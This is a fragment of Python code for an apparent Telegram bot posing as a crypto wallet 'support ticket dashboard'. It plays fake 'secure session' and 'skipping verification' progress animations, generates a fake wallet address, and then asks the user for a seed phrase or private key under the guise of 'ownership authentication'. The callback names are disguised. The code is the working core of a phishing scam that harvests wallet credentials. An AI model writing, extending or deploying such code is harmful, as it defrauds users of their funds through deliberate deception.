...
async def start_handler(message: types.Message):
    session_id = f"HEX#8-{random.randint(1000, 9999)}"
    date_str = datetime.now().strftime("%Y-%m-%d")

    intro_text = (
        "🔷 <b>SUPPORT TICKET DASHBOARD</b> 🔷\n"
        "──────────────────────────────\n"
    ...
    # Step 1: Animated initialization progress bar
    progress_msg = await message.answer("⏳ Initializing secure session...\n[░░░░░░░░░░] 0%")

    for percent in range(10, 101, 10):
        filled_blocks = percent // 10
        empty_blocks = 10 - filled_blocks
        bar = "█" * filled_blocks + "░" * empty_blocks
        await asyncio.sleep(0.3)  # adjust speed (0.2 = faster, 0.4 = slower)
        await progress_msg.edit_text(f"⏳ Initializing secure session...\n[{bar}] {percent}%")

    await asyncio.sleep(0.6)

    # Step 2: Display intro panel
    await progress_msg.edit_text(intro_text, parse_mode="HTML")

    # Step 3: Pause briefly and show main menu
...
async def skip_verification(callback: types.CallbackQuery, state: FSMContext):
    # Step 1: Start animated loading bar
    progress_msg = await callback.message.edit_text("⏳ Skipping verification...\n[░░░░░░░░░░] 0%")

    for percent in range(10, 101, 10):
        filled_blocks = percent // 10
        empty_blocks = 10 - filled_blocks
        bar = "█" * filled_blocks + "░" * empty_blocks
        await asyncio.sleep(0.3)  # Adjust speed of loading (0.3 = natural speed)
        await progress_msg.edit_text(f"⏳ Skipping verification...\n[{bar}] {percent}%")

    await asyncio.sleep(0.6)

    # Step 2: Generate a fake wallet address
    wallet = f"0x{random.randint(10**38, 10**39 - 1):x}"
    await state.update_data(wallet_address=wallet)

    # Step 3: Prepare next step buttons (Seed / Private Key)
    buttons = [
        [
            InlineKeyboardButton(text="🎫 Seed Phrase", callback_data=f"enter_ticket_{wallet}"),
            InlineKeyboardButton(text="🔑 Private Key", callback_data=f"enter_qwerty_{wallet}")
        ],
        [InlineKeyboardButton(text="⬅️ Back to Main Menu", callback_data="back_main")]
    ]
    ...
    text = (
        "⚙️ <b>Skip Verification</b>\n"
        "──────────────────────────────\n"
        "✅ Wallet verification skipped successfully.\n\n"
        "ℹ️ Wallet Ownership Authentication required below 👇"
    )

    await progress_msg.edit_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
    await callback.answer()
